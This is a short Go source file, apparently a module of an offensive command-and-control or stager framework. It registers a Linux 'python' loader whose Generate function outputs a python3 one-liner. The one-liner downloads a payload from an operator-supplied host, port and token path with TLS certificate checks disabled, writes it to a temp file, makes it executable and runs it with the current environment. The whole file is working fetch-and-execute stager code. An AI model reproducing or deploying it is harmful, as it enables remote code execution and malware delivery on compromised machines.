package loader

import "fmt"

type pythonLoader struct{}

func init() { Register(&pythonLoader{}) }

func (p *pythonLoader) Name() string        { return "python" }
func (p *pythonLoader) Description() string { return "python3 urllib HTTPS pull + exec" }
func (p *pythonLoader) RequiresTool() string { return "python3" }

func (p *pythonLoader) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (p *pythonLoader) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`python3 -c "import urllib.request,ssl,tempfile,os,stat;c=ssl._create_unverified_context();d=urllib.request.urlopen('https://%s:%s/p/%s',context=c).read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,os.stat(f.name).st_mode|stat.S_IEXEC);os.execve(f.name,[f.name],dict(os.environ))"`,
		opts.Host, opts.Port, opts.Token,
	), nil
}
